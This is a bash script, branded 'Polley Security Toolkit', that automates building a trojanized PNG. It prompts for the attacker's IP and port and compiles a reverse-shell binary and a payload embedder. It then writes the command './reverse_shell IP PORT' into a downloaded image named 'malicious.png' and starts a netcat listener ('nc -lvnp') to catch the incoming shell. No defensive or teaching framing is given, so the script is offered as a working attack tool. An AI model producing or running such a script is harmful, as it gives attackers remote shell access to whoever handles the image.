#!/bin/bash

# 1. Clean up old files and set permissions
echo "[*] Initializing environment..."
rm -f malicious.png
chmod +w . 2>/dev/null

# 2. Dependency & File Check
if ! ldconfig -p | grep -q libpng; then
    echo "[!] libpng not found. Installing..."
    sudo apt update && sudo apt install libpng-dev netcat-traditional wget -y
fi

# 3. Auto-Restore Missing Base Image
if [ ! -f "benign.png" ]; then
    echo "[!] benign.png missing. Downloading base image..."
    wget -q -O benign.png https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png
fi

# 4. User Input for Customization
echo "--- Polley Security Toolkit ---"
read -p "Enter your IP address (LHOST): " MY_IP
read -p "Enter your Port (LPORT) [default 4444]: " MY_PORT
MY_PORT=${MY_PORT:-4444}

# 5. Clean Compilation
echo "[*] Compiling binaries..."
gcc reverse_shell.c -o reverse_shell
if [ $? -ne 0 ]; then echo "[!] Error compiling reverse_shell.c"; exit 1; fi

gcc embed_payload.c -o embed_payload -lpng
if [ $? -ne 0 ]; then echo "[!] Error compiling embed_payload.c"; exit 1; fi

# 6. Execution & Embedding
echo "[*] Creating malicious.png for IP: $MY_IP"
# Using a relative path for the binary to ensure compatibility across different installs
./embed_payload benign.png malicious.png "./reverse_shell $MY_IP $MY_PORT"

# 7. Verification and Listener
sleep 1 # Small pause to allow the file system to update
if [ -f "malicious.png" ]; then
    echo "[+] SUCCESS: malicious.png is ready."
    echo "[*] Starting listener on port $MY_PORT..."
    echo "[*] (Press CTRL+C to stop when finished)"
    nc -lvnp $MY_PORT
else
    echo "[!] ERROR: Failed to create malicious.png."
    echo "[*] Troubleshooting: Try running 'chmod +x embed_payload' manually."
fi
